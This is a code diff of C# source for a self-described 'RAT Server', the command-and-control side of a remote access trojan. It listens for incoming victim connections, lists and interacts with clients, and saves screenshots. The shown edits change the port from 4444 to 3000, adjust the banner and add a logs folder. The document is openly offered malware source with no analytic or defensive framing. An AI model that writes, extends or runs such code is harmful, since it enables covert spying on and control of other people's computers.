@@ -11,9 +11,10 @@ class RATServer
 
     static void Main()
     {
-        int listenPort = 4444;
+        int listenPort = 3000;
         TcpListener listener = new TcpListener(IPAddress.Any, listenPort);
         listener.Start();
+        Console.WriteLine("[+] Starting up");
         Console.WriteLine("[+] Listening for incoming connections on port " + listenPort);
 
         Thread acceptThread = new Thread(() => AcceptConnections(listener));
@@ -23,7 +24,7 @@ class RATServer
         {
             Console.Clear();
             Console.WriteLine("=== RAT Server ===");
-            Console.WriteLine("made by daimy :)");
+            Console.WriteLine("-- made by daimy --");
             Console.WriteLine("1. List Clients");
             Console.WriteLine("2. Interact with Client");
             Console.WriteLine("3. Exit");
@@ -131,6 +132,11 @@ class ClientHandler
             if (!Directory.Exists(screenshotsDirectory))
             {
                 Directory.CreateDirectory(screenshotsDirectory);
+            }
+            string logsDirectory = "logs";
+            if (!Directory.Exists(logsDirectory))
+            {
+                Directory.CreateDirectory(logsDirectory);
             }
 
             string line;
